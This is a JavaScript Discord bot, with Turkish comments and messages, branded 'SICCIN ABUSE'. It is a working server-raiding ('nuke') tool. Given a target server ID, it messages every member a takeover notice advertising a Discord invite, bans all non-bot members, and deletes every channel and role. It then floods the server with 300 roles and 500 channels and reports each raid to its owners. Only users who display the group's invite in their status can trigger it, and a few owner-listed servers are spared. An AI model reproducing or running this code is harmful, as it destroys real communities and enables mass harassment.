require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType,
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================== KORUNAN SUNUCULAR ==================
const PROTECTED_SERVERS = [
  "1457028521707962370",
  "1457597987294285979"
];

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(
    (a) =>
      a.type === ActivityType.Custom &&
      a.state &&
      (a.state.includes("/siccin") || a.state.includes(".gg/siccin"))
  );
}

// ================== KORUNAN SUNUCU KONTROLÜ ==================
function isProtectedServer(guildId) {
  return PROTECTED_SERVERS.includes(guildId.toString());
}

// ================== EMBEDLER ==================
function mainSiccinEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#3a0000") // ÇOK KOYU KIRMIZI
    .setAuthor({
      name: "ＳＩＣＣＩＮ ABUSE",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `Özellikler
• Anında Herkesi Banlar
• Herkese DM Çeker
• Tüm Kanal ve Rolleri Siler
• 500 Kanal & 300 Rol Oluşturur

Nasıl Kullanılır?
Butona tıkla ve hedef sunucu ID gir.

⚠️ KORUNAN SUNUCULAR:
${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`
    );
}

function dmEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#2b0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ EJECTED",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setDescription(
      `ＳＩＣＣＩＮ Tarafından
${guild.name} sunucusuna el konulmuştur.

#GLORY TO ＳＩＣＣＩＮ
https://discord.gg/siccin`
    );
}

function protectedServerErrorEmbed(targetGuildId) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚫 ERİŞİM ENGELLENDİ")
    .setDescription(
      `**${targetGuildId}** ID'li sunucu koruma altındadır!\n\nBu sunucuya herhangi bir işlem yapılamaz.`
    )
    .setTimestamp();
}

function logEmbed(data) {
  return new EmbedBuilder()
    .setColor("#1a0000")
    .setAuthor({
      name: `${data.usedGuild} | siccin ejected`,
    })
    .setThumbnail(data.targetIcon)
    .addFields(
      {
        name: "Kullanan Kişi",
        value: `ID: ${data.userId}\nKullanıcı Adı: ${data.userTag}`,
      },
      {
        name: "Hedef Sunucu",
        value: `ID: ${data.guildId}\nSunucu İsmi: ${data.guildName}`,
      },
      {
        name: "İstatistik",
        value:
          `Banlanan Kişi Sayısı: ${data.banned}\n` +
          `Silinen Rol Sayısı: ${data.rolesDeleted}\n` +
          `Silinen Kanal Sayısı: ${data.channelsDeleted}\n` +
          `Eklenen Rol Sayısı: ${data.rolesCreated}\n` +
          `Eklenen Kanal Sayısı: ${data.channelsCreated}`,
      }
    );
}

function protectionAlertEmbed(data) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚨 KORUNAN SUNUCUYA ERİŞİM DENEMESİ")
    .addFields(
      {
        name: "Kullanıcı",
        value: `${data.userTag} (${data.userId})`,
        inline: true,
      },
      {
        name: "Bulunduğu Sunucu",
        value: `${data.usedGuild}`,
        inline: true,
      },
      {
        name: "Hedef Sunucu ID",
        value: `${data.targetGuildId}`,
        inline: false,
      },
      {
        name: "Durum",
        value: "ENGELLENDİ",
        inline: true,
      }
    )
    .setTimestamp();
}

// ================== SICCiN İŞLEM ==================
async function startSiccin(interaction, targetGuildId) {
  const executor = interaction.user;
  const usedGuild = interaction.guild.name;

  // KORUNAN SUNUCU KONTROLÜ
  if (isProtectedServer(targetGuildId)) {
    // Owner'a bildir
    const alertData = {
      userTag: executor.tag,
      userId: executor.id,
      usedGuild: usedGuild,
      targetGuildId: targetGuildId
    };
    
    const alertEmbed = protectionAlertEmbed(alertData);
    
    try {
      await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [alertEmbed] }));
      await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [alertEmbed] }));
    } catch (err) {
      console.error("Owner'a bildirim gönderilemedi:", err);
    }
    
    // Kullanıcıya hata göster
    return interaction.followUp({
      embeds: [protectedServerErrorEmbed(targetGuildId)],
      ephemeral: true,
    });
  }

  const guild = client.guilds.cache.get(targetGuildId);
  if (!guild)
    return interaction.followUp({
      content: "❌ Bot hedef sunucuda değil",
      ephemeral: true,
    });

  await interaction.followUp({
    content: "🔥 SICCiN BAŞLATILDI",
    ephemeral: true,
  });

  let banned = 0,
    rolesDeleted = 0,
    channelsDeleted = 0;

  const members = await guild.members.fetch();
  for (const m of members.values()) {
    if (m.user.bot) continue;
    await m.send({ embeds: [dmEmbed(guild)] }).catch(() => {});
    await m.ban({ reason: "SICCiN" }).then(() => banned++).catch(() => {});
  }

  for (const c of guild.channels.cache.values()) {
    await c.delete().then(() => channelsDeleted++).catch(() => {});
  }

  for (const r of guild.roles.cache.values()) {
    if (r.managed) continue;
    await r.delete().then(() => rolesDeleted++).catch(() => {});
  }

  let rolesCreated = 0;
  let channelsCreated = 0;

  for (let i = 0; i < 300; i++) {
    await guild.roles
      .create({ name: "ＳＩＣＣＩＮ 🔱" })
      .then(() => rolesCreated++)
      .catch(() => {});
  }

  for (let i = 0; i < 500; i++) {
    await guild.channels
      .create({ name: "ＳＩＣＣＩＮ 🔱", type: 0 })
      .then(() => channelsCreated++)
      .catch(() => {});
  }

  const log = logEmbed({
    usedGuild,
    userId: executor.id,
    userTag: executor.tag,
    guildId: guild.id,
    guildName: guild.name,
    targetIcon: guild.iconURL({ dynamic: true }),
    banned,
    rolesDeleted,
    channelsDeleted,
    rolesCreated,
    channelsCreated,
  });

  await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
  await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] })).catch(() => {});
}

client.on("interactionCreate", async (interaction) => {

  // ================== BUTTON ==================
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("guildID")
            .setLabel("Hedef Sunucu ID")
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setPlaceholder("Sunucu ID girin...")
        )
      );

    return interaction.showModal(modal);
  }

  // ================== MODAL ==================
  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const member = await interaction.guild.members.fetch(interaction.user.id);

    if (!hasSiccinStatus(member)) {
      return interaction.reply({
        content: "❌ Durumunda /siccin veya .gg/siccin yok",
        ephemeral: true,
      });
    }

    const gid = interaction.fields.getTextInputValue("guildID").trim();

    // KORUNAN SUNUCU KONTROLÜ (ön kontrol)
    if (isProtectedServer(gid)) {
      const alertData = {
        userTag: interaction.user.tag,
        userId: interaction.user.id,
        usedGuild: interaction.guild.name,
        targetGuildId: gid
      };
      
      const alertEmbed = protectionAlertEmbed(alertData);
      
      try {
        await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [alertEmbed] }));
        await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [alertEmbed] }));
      } catch (err) {
        console.error("Owner'a bildirim gönderilemedi:", err);
      }
      
      return interaction.reply({
        embeds: [protectedServerErrorEmbed(gid)],
        ephemeral: true,
      });
    }

    await interaction.deferReply({ ephemeral: true });
    return startSiccin(interaction, gid);
  }

});

// ================== KOMUT EKLEME (isteğe bağlı) ==================
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  // ID ekleme komutu
  if (message.content.startsWith("!ekle") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !ekle <sunucu-id>");
    }

    const newId = args[1];
    if (PROTECTED_SERVERS.includes(newId)) {
      return message.reply("Bu ID zaten koruma listesinde!");
    }

    PROTECTED_SERVERS.push(newId);
    message.reply(`✅ ${newId} ID'li sunucu koruma listesine eklendi!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // ID silme komutu
  if (message.content.startsWith("!sil") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !sil <sunucu-id>");
    }

    const removeId = args[1];
    const index = PROTECTED_SERVERS.indexOf(removeId);
    if (index === -1) {
      return message.reply("Bu ID koruma listesinde bulunamadı!");
    }

    PROTECTED_SERVERS.splice(index, 1);
    message.reply(`✅ ${removeId} ID'li sunucu koruma listesinden kaldırıldı!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // Liste görüntüleme komutu
  if (message.content === "!korunanlar") {
    message.reply(`**Korunan Sunucular:**\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }
});

// ================== BOT HAZIR ==================
client.on("ready", () => {
  console.log(`${client.user.tag} olarak giriş yapıldı!`);
  console.log(`Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
  
  client.user.setActivity({
    name: `${PROTECTED_SERVERS.length} sunucu korunuyor`,
    type: ActivityType.Watching,
  });
});

// ================== CRASH KALKAN ==================
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED:", err);
});
process.on("uncaughtException", (err) => {
  console.log("CRASH:", err);
});

client.login(BOT_TOKEN);
